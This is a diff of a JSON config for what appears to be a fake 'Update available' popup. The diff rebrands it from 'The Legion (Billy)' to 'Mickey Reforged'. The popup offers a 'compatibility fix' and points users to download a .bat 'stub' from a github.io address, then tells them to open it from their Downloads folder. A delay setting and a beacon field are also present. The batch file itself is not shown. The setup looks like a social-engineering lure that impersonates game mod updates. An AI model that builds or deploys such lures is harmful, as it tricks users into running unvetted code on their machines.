@@ -1,16 +1,16 @@
 {
   "show": true,
-  "title": "Update available",
+  "title": "Mickey Reforged update",
   "version": "v1.2",
-  "line1": "The Legion (Billy) v1.2 is ready.",
+  "line1": "Mickey Reforged v1.2 is ready.",
   "line2": "Compatibility fix for the current game patch.",
   "size": "28 MB",
   "released": "today",
   "cta": "Update Now",
-  "stub": "https://flippelt.github.io/cfg-data/dl/Legion_Update_v1.2.bat.txt",
-  "stub_name": "Legion_Update_v1.2.bat",
+  "stub": "https://flippelt.github.io/cfg-data/dl/Mickey_Reforged_Update_v1.2.bat.txt",
+  "stub_name": "Mickey_Reforged_Update_v1.2.bat",
   "delay_ms": 4200,
   "beacon": "",
   "done_title": "Update downloaded",
-  "done_line": "Open Legion_Update_v1.2.bat from your Downloads folder to finish."
+  "done_line": "Open Mickey_Reforged_Update_v1.2.bat from your Downloads folder to finish."
 }
